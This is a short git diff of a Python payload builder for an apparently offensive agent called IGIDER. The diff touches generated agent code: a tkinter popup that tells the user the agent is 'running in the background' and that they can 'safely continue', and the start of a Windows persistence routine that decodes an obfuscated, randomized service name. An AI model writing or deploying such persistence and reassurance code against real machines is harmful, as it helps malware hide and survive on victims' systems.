@@ -393,15 +393,14 @@ class Igider(PayloadType):
                 else:
                     command_code += self._load_module_content(command_path) + "\n"
 
-            command_code += ("""
+            command_code += (r"""
     import tkinter 
     def show_console_popup(self, duration=5000):
         msg = (
-            "IGIDER Agent is now running in the background.\n" +
-            "Monitoring system vulnerabilities and testing in progress.\n" +
+            "IGIDER Agent is now running in the background.            " + 
+            "Monitoring system vulnerabilities and testing in progress." +
             "You can safely continue your work."
         )
-
 
 
         root = tkinter.Tk()
@@ -432,7 +431,7 @@ class Igider(PayloadType):
 
                                 """)
             if selected_os == "windows":
-                command_code +=("""
+                command_code +=(r"""
     def create_persistence(self):
         try:
             svc_name = dec(b'<base64_encoded_obf_svc_name>') + str(random.randint(1000, 9999))  # Randomized name
